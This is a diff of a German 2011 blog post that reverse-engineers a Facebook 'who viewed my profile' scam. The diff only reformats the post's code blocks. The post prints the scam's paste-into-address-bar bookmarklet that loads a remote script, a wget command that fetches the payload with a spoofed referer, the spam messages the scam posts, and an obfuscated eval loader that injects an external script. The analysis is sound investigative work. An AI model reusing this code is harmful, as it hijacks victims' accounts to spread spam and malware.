@@ -1,4 +1,4 @@
-Auf den Spuren von Facebook-&quot;Viren&quot;
+Auf den Spuren von Facebook-"Viren"
 #############################################
 :date: 2011-04-27 01:50
 :tags: bugs, de, facebook, reverse engineering, virus
@@ -12,7 +12,7 @@ man "einfach" seine "Stalker" herrausfinden kann.
 Das ganze ist denkbar einfach: man geht auf facebook, kopiert den Javascript der dort
 bereit gestellt wird in seine Adresszeile:
 
-::
+.. code-block :: javascript
 
     javascript:(a=(b=document).createElement('script')).src='//iamedwards.com/german.php?'+Math.random(),b.body.appendChild(a);void(0)
 
@@ -31,7 +31,7 @@ nicht alle Parameter stimmen, man auf Google weitergeleitet wird.Wichtig
 ist hierbei auch der Referer, der auf facebook.com angepasst werden
 muss:
 
-::
+.. code-block :: bash
 
     21:55:27 seda:~/
     % wget --referer="http://facebook.com" "http://iamedwards.com/german.php?0.2344543643"
@@ -86,7 +86,7 @@ eingestellt, werden aber nicht durch whitespaces ersetzt) wer es nochmal
 schoener Betrachten moechte sei hierhin verwiesen:
 `http://pastebin.com/ZUNuYfWT`_
 
-::
+.. code-block :: javascript
 
     var chatmessage="%firstname% wow facebook kann dir jetzt anzeigen wer dein Profil ansieht! Schaus dir an @ ow.ly/4GpHi";
     var postmessage="Meine Top Profil-Stalker: %tf% - 1136 Besuche %tf% - 983 Besuche %tf% - 542 Besuche %tf% - 300 Besuche Schau dir an wer dein Profil sieht @ http://apps.facebook.com/seeyouuu/?o4sshg2m";
@@ -353,14 +353,14 @@ Ich werde daraus nicht wirklich schlau...aber es muss wohl irgendwas mit dem Pro
 \*achselzucken\* Zudem stellen sie immer sicher, dass JAvascript
 aktiviert ist und auch kein Adblock einschalten ist:
 
-::
+.. code-block :: javascript
 
     var isloaded = false;if (!isloaded) { window.location = 'http://impressionvalue.mobi/abp'; }
 
 Es wird eine Variable isloaded auf false gesetzt. Dann wird ein externes
 Script geladen welches so aussieht:
 
-::
+.. code-block :: javascript
 
     eval(function(p,a,c,k,e,d){e=function(c){return(c35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3 h=["\\6\\2\\1\\b\\7\\1\\5\\4\\6\\j\\d"];3 f=["\\d\\8\\i\\1\\9\\7\\o\\1\\8\\4\\2\\k\\2"];3 g=["\\2\\l\\a"];3 e=["\\i\\1\\9\\7\\m\\5"];3 n=["\\1\\5\\a\\b\\j\\6\\w\\4\\2\\k\\2"];p.D(z("%y B=\\"C/A\\" x=\\"r://"+h[0]+"/"+f[0]+"?"+g[0]+"=q&s;"+e[0]+"=t\\"%c%v/u%c"));',40,40,'|x61|x70|var|x2E|x64|x63|x65|x79|x74|x62|x6C|3E|x6D|g3909d93711e1c2ec49f5294bd1915e8c|m86f77129073c6c0dae7a7545e09157e7|p164a505b4127eb6748babbd88555e15b|cf7ed09726cefcccda7fc63312ccb77de|x67|x6F|x68|x75|x69|a23256111997cb2d310fc1d292215b1b5|x77|document|47931|http|amp|MTg0MDkz|script|3C|x6B|src|3Cscript|unescape|javascript|type|text|write'.split('|'),0,{}))
 
